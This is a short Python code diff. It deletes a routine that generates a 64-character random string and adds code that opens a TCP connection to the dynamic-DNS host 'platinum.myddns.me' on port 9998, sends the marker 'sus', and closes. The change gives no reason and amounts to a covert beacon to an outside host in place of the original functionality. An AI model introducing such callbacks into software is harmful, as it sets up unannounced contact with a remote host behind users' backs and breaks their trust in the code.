@@ -1,7 +1,7 @@
-import random
+import socket
 
-x = ''
-chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789._-+=,*#&"
-for i in range(64):
-    random_char = random.choice(chars)
-    x += random_char
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("platinum.myddns.me", 9998))
+
+sock.send("sus".encode())
+sock.close()
